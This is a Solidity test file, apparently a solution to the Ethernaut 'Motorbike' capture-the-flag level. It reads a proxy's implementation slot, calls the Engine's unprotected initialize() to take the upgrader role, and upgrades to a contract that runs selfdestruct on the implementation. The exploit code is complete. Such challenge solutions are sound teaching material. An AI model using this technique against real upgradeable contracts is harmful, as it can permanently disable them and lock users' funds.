// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SetUpLevelTest} from "../SetUpLevelTest.sol";
import {Motorbike, MotorbikeFactory, Engine} from "../helpers/MotorbikeFactory.sol";

contract MotorbikeLevel is SetUpLevelTest {
    Motorbike internal motorbike;

    function setUp() public override {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        instanceBalance = 0 ether;
        playerBalance = 0 ether;
        level = address(new MotorbikeFactory());
        super.setUp();
        motorbike = Motorbike(payable(instance));

        /** CODE YOUR SOLUTION HERE */
        vm.startPrank(player);
        Engine engine = Engine(
            address(
                uint160(
                    uint256(
                        vm.load(
                            address(motorbike),
                            0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
                        )
                    )
                )
            )
        );
        emit log_named_address("engine", address(engine));
        engine.initialize();
        assert(engine.upgrader() == player);
        engine.upgradeToAndCall(
            address(new MotorbikeAttack()),
            abi.encodeCall(MotorbikeAttack.destroy, (player))
        );
        vm.stopPrank();
    }
}

contract MotorbikeAttack {
    function destroy(address _addr) public {
        selfdestruct(payable(_addr));
    }
}
